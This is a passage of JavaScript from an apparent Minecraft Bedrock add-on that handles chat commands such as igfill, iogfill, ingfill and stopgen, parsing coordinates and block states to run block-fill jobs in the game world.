                            let a = fillBlocksHP(coordinatesa, coordinatesb, player.dimension, firstblockname, firstblockstates, { matchingBlock: matchingblock[0], matchingBlockStates: matchingblock[1] });
                            let endTime = Date.now();
                            player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                        }
                        catch (e) {
                            eventData.sender.sendMessage("§c" + e + e.stack);
                        }
                        finally {
                            ta?.remove();
                        } }, 2);
                    }
                    catch (e) {
                        eventData.sender.sendMessage("§c" + e + e.stack);
                    } });
                    //            try{system.run(()=>{player.dimension.fillBlocks(evaluateCoordinates(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[0][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[1][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[2][0], player.location, player.getRotation()), evaluateCoordinates(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[3][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[4][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0], player.location, player.getRotation()), mcServer.BlockPermutation.resolve(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")+1).split(" ")[0], extractJSONStrings(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")).split(" ").slice(1).join(" "), false)[0]), {matchingBlock: mcServer.BlockPermutation.resolve(getParametersFromString(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")+1)).results[2], extractJSONStrings(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")).split(" ").slice(1).join(" "), false)[1])}); }); }catch(e){eventData.sender.sendMessage("§c" + e + e.stack)}
                }
                break;
            case !!switchTest.match(/^igfill$/):
                {
                    eventData.cancel = true;
                    let coordinatesa = evaluateCoordinates(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[0][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[1][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[2][0], player.location, player.getRotation());
                    let coordinatesb = evaluateCoordinates(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[3][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[4][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0], player.location, player.getRotation());
                    let firstblocknameindex = Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index + Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ") + 1;
                    let reststringaftercoordinates = switchTestB.split(" ").slice(1).join(" ").slice(firstblocknameindex);
                    let firstblockname = reststringaftercoordinates.split(" ")[0];
                    let firstblockstates = reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("{") ? JSONParse(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart(), false)[0]) : reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("[") ? JSONParse(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().replaceAll("=", ":").replaceAll("[", "{").replaceAll("]", "}"), false)[0]) : undefined;
                    let lastblockname = reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("{") ? reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().slice(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart(), false)[0].length).trimStart().split(" ")[0] : reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("[") ? reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().slice(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().replaceAll("=", ":").replaceAll("[", "{").replaceAll("]", "}"), false)[0].length).trimStart().split(" ")[0] : reststringaftercoordinates.trimStart().split(" ").slice(1).join(" ").trimStart().split(" ")[0];
                    let somethingtest = reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("{") ? reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().slice(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart(), false)[0].length).trimStart().split(" ").slice(1).join(" ").trim() : reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("[") ? reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().slice(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().replaceAll("=", ":").replaceAll("[", "{").replaceAll("]", "}"), false)[0].length).trimStart().split(" ").slice(1).join(" ").trim() : reststringaftercoordinates.trimStart().split(" ").slice(1).join(" ").trimStart().split(" ").slice(1).join(" ").trim();
                    let lastblockstates = somethingtest.startsWith("{") ? JSONParse(extractJSONStrings(somethingtest, false)[0]) : somethingtest.startsWith("[") ? JSONParse(extractJSONStrings(somethingtest.replaceAll("=", ":").replaceAll("[", "{").replaceAll("]", "}"), false)[0]) : undefined;
                    let matchingblock = lastblockname == "" ? undefined : lastblockname == "keep" ? ["air"] : [lastblockname, lastblockstates]; /*
                    console.warn(JSONStringify({coordinatesa, coordinatesb, firstblockname, firstblocknameindex, reststringaftercoordinates, firstblockstates, lastblockname, somethingtest, lastblockstates, matchingblock}))*/
                    try {
                        system.run(() => { player.sendMessage("IFill Command Started, to cancel type in " + String(world.getDynamicProperty("andexdbSettings:chatCommandPrefix") ?? "\\") + "stopgen " + system.runJob(fillBlocksCG(coordinatesa, coordinatesb, player.dimension, firstblockname, firstblockstates, matchingblock?.[0], matchingblock?.[1], false, (a, timea, timeb, totalTime, player) => { player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${totalTime} ms`); }, player))); });
                    }
                    catch (e) {
                        eventData.sender.sendMessage("§c" + e + e.stack);
                    }
                    //            try{system.run(()=>{player.dimension.fillBlocks(evaluateCoordinates(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[0][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[1][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[2][0], player.location, player.getRotation()), evaluateCoordinates(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[3][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[4][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0], player.location, player.getRotation()), mcServer.BlockPermutation.resolve(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")+1).split(" ")[0], extractJSONStrings(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")).split(" ").slice(1).join(" "), false)[0]), {matchingBlock: mcServer.BlockPermutation.resolve(getParametersFromString(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")+1)).results[2], extractJSONStrings(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")).split(" ").slice(1).join(" "), false)[1])}); }); }catch(e){eventData.sender.sendMessage("§c" + e + e.stack)}
                }
                break;
            case !!switchTest.match(/^iogfill$/):
                {
                    eventData.cancel = true;
                    let coordinatesa = evaluateCoordinates(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[0][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[1][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[2][0], player.location, player.getRotation());
                    let coordinatesb = evaluateCoordinates(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[3][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[4][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0], player.location, player.getRotation());
                    let firstblocknameindex = Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index + Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ") + 1;
                    let reststringaftercoordinates = switchTestB.split(" ").slice(1).join(" ").slice(firstblocknameindex);
                    let firstblockname = reststringaftercoordinates.split(" ")[0];
                    let firstblockstates = reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("{") ? JSONParse(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart(), false)[0]) : reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("[") ? JSONParse(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().replaceAll("=", ":").replaceAll("[", "{").replaceAll("]", "}"), false)[0]) : undefined;
                    let lastblockname = reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("{") ? reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().slice(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart(), false)[0].length).trimStart().split(" ")[0] : reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("[") ? reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().slice(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().replaceAll("=", ":").replaceAll("[", "{").replaceAll("]", "}"), false)[0].length).trimStart().split(" ")[0] : reststringaftercoordinates.trimStart().split(" ").slice(1).join(" ").trimStart().split(" ")[0];
                    let somethingtest = reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("{") ? reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().slice(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart(), false)[0].length).trimStart().split(" ").slice(1).join(" ").trim() : reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("[") ? reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().slice(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().replaceAll("=", ":").replaceAll("[", "{").replaceAll("]", "}"), false)[0].length).trimStart().split(" ").slice(1).join(" ").trim() : reststringaftercoordinates.trimStart().split(" ").slice(1).join(" ").trimStart().split(" ").slice(1).join(" ").trim();
                    let lastblockstates = somethingtest.startsWith("{") ? JSONParse(extractJSONStrings(somethingtest, false)[0]) : somethingtest.startsWith("[") ? JSONParse(extractJSONStrings(somethingtest.replaceAll("=", ":").replaceAll("[", "{").replaceAll("]", "}"), false)[0]) : undefined;
                    let matchingblock = lastblockname == "" ? undefined : lastblockname == "keep" ? ["air"] : [lastblockname, lastblockstates]; /*
                    console.warn(JSONStringify({coordinatesa, coordinatesb, firstblockname, firstblocknameindex, reststringaftercoordinates, firstblockstates, lastblockname, somethingtest, lastblockstates, matchingblock}))*/
                    try {
                        system.run(() => { player.sendMessage("IOFill Generator/Job Started, to cancel type in " + String(world.getDynamicProperty("andexdbSettings:chatCommandPrefix") ?? "\\") + "stopgen " + system.runJob(fillBlocksCG(coordinatesa, coordinatesb, player.dimension, firstblockname, firstblockstates, matchingblock?.[0], matchingblock?.[1], false, (a, timea, timeb, totalTime, player) => { player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${totalTime} ms`); }, player))); });
                    }
                    catch (e) {
                        eventData.sender.sendMessage("§c" + e + e.stack);
                    }
                    //            try{system.run(()=>{player.dimension.fillBlocks(evaluateCoordinates(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[0][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[1][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[2][0], player.location, player.getRotation()), evaluateCoordinates(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[3][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[4][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0], player.location, player.getRotation()), mcServer.BlockPermutation.resolve(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")+1).split(" ")[0], extractJSONStrings(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")).split(" ").slice(1).join(" "), false)[0]), {matchingBlock: mcServer.BlockPermutation.resolve(getParametersFromString(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")+1)).results[2], extractJSONStrings(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")).split(" ").slice(1).join(" "), false)[1])}); }); }catch(e){eventData.sender.sendMessage("§c" + e + e.stack)}
                }
                break;
            case !!switchTest.match(/^stopgen$/):
                {
                    eventData.cancel = true;
                    try {
                        system.clearJob(Number(switchTestB.split(" ")[1]));
                        player.sendMessage(`Successfully Clear Job/Generator With ID: ${switchTestB.split(" ")[1]}`);
                    }
                    catch (e) {
                        eventData.sender.sendMessage("§c" + e + e.stack);
                    }
                    //            try{system.run(()=>{player.dimension.fillBlocks(evaluateCoordinates(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[0][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[1][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[2][0], player.location, player.getRotation()), evaluateCoordinates(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[3][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[4][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0], player.location, player.getRotation()), mcServer.BlockPermutation.resolve(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")+1).split(" ")[0], extractJSONStrings(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")).split(" ").slice(1).join(" "), false)[0]), {matchingBlock: mcServer.BlockPermutation.resolve(getParametersFromString(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")+1)).results[2], extractJSONStrings(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")).split(" ").slice(1).join(" "), false)[1])}); }); }catch(e){eventData.sender.sendMessage("§c" + e + e.stack)}
                }
                break;
            case !!switchTest.match(/^ingfill$/):
                {
                    eventData.cancel = true;
                    let coordinatesa = evaluateCoordinates(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[0][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[1][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[2][0], player.location, player.getRotation());
                    let coordinatesb = evaluateCoordinates(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[3][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[4][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0], player.location, player.getRotation());
                    let firstblocknameindex = Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index + Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ") + 1;
                    let reststringaftercoordinates = switchTestB.split(" ").slice(1).join(" ").slice(firstblocknameindex);
                    let firstblockname = reststringaftercoordinates.split(" ")[0];
                    let firstblockstates = reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("{") ? JSONParse(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart(), false)[0]) : reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("[") ? JSONParse(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().replaceAll("=", ":").replaceAll("[", "{").replaceAll("]", "}"), false)[0]) : undefined;
                    let lastblockname = reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("{") ? reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().slice(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart(), false)[0].length).trimStart().split(" ")[0] : reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("[") ? reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().slice(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().replaceAll("=", ":").replaceAll("[", "{").replaceAll("]", "}"), false)[0].length).trimStart().split(" ")[0] : reststringaftercoordinates.trimStart().split(" ").slice(1).join(" ").trimStart().split(" ")[0];
                    let somethingtest = reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("{") ? reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().slice(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart(), false)[0].length).trimStart().split(" ").slice(1).join(" ").trim() : reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("[") ? reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().slice(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().replaceAll("=", ":").replaceAll("[", "{").replaceAll("]", "}"), false)[0].length).trimStart().split(" ").slice(1).join(" ").trim() : reststringaftercoordinates.trimStart().split(" ").slice(1).join(" ").trimStart().split(" ").slice(1).join(" ").trim();
                    let lastblockstates = somethingtest.startsWith("{") ? JSONParse(extractJSONStrings(somethingtest, false)[0]) : somethingtest.startsWith("[") ? JSONParse(extractJSONStrings(somethingtest.replaceAll("=", ":").replaceAll("[", "{").replaceAll("]", "}"), false)[0]) : undefined;
                    let matchingblock = lastblockname == "" ? undefined : lastblockname == "keep" ? ["air"] : [lastblockname, lastblockstates]; /*
                    console.warn(JSONStringify({coordinatesa, coordinatesb, firstblockname, firstblocknameindex, reststringaftercoordinates, firstblockstates, lastblockname, somethingtest, lastblockstates, matchingblock}))*/
                    try {
                        system.run(() => { let a = system.runJob(fillBlocksCG(coordinatesa, coordinatesb, player.dimension, firstblockname, firstblockstates, matchingblock?.[0], matchingblock?.[1], true, (a) => { player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled`); })); });
                    }
                    catch (e) {
                        eventData.sender.sendMessage("§c" + e + e.stack);
                    }
                    //            try{system.run(()=>{player.dimension.fillBlocks(evaluateCoordinates(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[0][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[1][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[2][0], player.location, player.getRotation()), evaluateCoordinates(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[3][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[4][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0], player.location, player.getRotation()), mcServer.BlockPermutation.resolve(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")+1).split(" 